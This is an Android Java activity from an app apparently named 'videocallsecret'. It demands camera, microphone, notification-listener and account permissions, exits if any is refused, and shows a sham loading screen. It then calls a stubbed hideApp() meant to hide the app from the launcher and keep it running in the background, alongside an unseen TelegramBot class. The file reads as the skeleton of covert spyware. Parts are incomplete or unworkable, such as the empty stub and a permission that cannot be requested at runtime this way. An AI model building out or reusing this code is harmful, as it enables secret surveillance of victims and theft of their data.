package com.example.videocallsecret;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE_PERMISSIONS = 1001;
    private ProgressBar loadingBar;
    private TextView loadingText;
    private TelegramBot telegramBot;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        loadingBar = findViewById(R.id.loadingBar);
        loadingText = findViewById(R.id.loadingText);
        telegramBot = new TelegramBot();

        requestPermissions();
    }

    private void requestPermissions() {
        String[] permissions = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
            Manifest.permission.GET_ACCOUNTS
        };

        ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE_PERMISSIONS);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    finish(); // Exit app if permission is denied
                    return;
                }
            }
            startLoading();
        }
    }

    private void startLoading() {
        loadingBar.setProgress(3);
        loadingText.setText("Requesting permissions...");

        new Handler().postDelayed(() -> {
            loadingBar.setProgress(66);
            loadingText.setText("Loading complete!");
            hideApp();
        }, 3000); // Simulate loading time
    }

    private void hideApp() {
        // Hide app from launcher and run in background
        // Implement your logic here
    }
}